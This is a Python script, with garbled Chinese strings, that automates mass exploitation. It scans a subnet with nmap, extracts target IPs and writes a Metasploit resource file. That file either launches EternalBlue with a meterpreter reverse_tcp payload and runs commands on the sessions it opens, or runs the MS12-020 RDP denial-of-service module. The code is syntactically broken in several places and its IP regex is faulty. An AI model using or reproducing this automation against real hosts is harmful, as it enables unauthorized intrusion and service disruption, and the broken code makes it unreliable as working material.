#!/usr/bin/python3
#coding��utf-8
import os
import re

print('by ����')
print('by ����')
print('by ����')
print('֧��ms17070����֮����ms12020����������δ��֧��ms08067��ms15030')
a = input("���������ip������:192.168.1.0/24:"+"\n")
#os.system("nmap -T 5 192.168.3.0/24 >>scann.txt")
os.system("nmap -T 5 {} >>scann.txt".format(a))
print("ɨ�����")



    def log_read():
        with open("scann.txt", mode="r") as f:
            result = list(set(re.findall(r"\d{3}\.\d{3}\.\d{1,3}\.\d{1,3}", f.read())))
        result = "   ".join(result)
        return result

    def ip_write_file(result):
        with open('ip.txt', 'w') as f:
            f.write(result)
        print("---���IP---")
        os.system("cat ip.txt")
        print("\n")

ms = input("����ms17010����ms12020"):
if ms == ms17010:

    def config_write_file(result):
        config = open('cs.rc', 'w')
        config.write('use exploit/windows/smb/ms17_010_eternalblue' + "\n")
        config.write('set PAYLOAD windows/x64/meterpreter/reverse_tcp' + "\n")
        config.write('set LHOST eth0'+"\n")
        config.write('set RHOSTS ')
        b = input('�Ƿ�ȫ������,������y����n:'+"\n")
        if b == 'y':
            for ele in result.split("  "):
                config.write(ele)
        elif b == 'n':
            c = input('��������Ҫ������ip:'+"\n")
            config.write('set RHOSTS {}'.format(c))
        config.write("\n")
        config.write("exploit"+"\n")
        config.write("sessions -C ls"+"\n")
        config.close()
        
    def main():
        result = log_read()
        ip_write_file(result)
        config_write_file(result)

        os.system("chmod 777 cs.rc")
        print("���ڵ���msf��ʼ����")
        mg = os.system('msfconsole -r cs.rc')
        f = open('cs.rc', 'w')
        f.close()
elif ms == ms12020;

        def config_write_file(result):
        config = open('cs.rc', 'w')
        config.write('use auxiliary/dos/windows/rdp/ms12_020_maxchannelids' + "\n")
        config.write(' set THREADS 45' + "\n")
        config.write('set LHOST eth0'+"\n")
        config.write('set RHOSTS ')
        b = input('�Ƿ�ȫ������,������y����n:'+"\n")
        if b == 'y':
            for ele in result.split("  "):
                config.write(ele)
        elif b == 'n':
            c = input('��������Ҫ������ip:'+"\n")
            config.write('set RHOSTS {}'.format(c))
        config.write("\n")
        config.write("exploit"+"\n")
        config.write("sessions -C ls"+"\n")
        config.close()
if __name__ == '__main__':
        main()
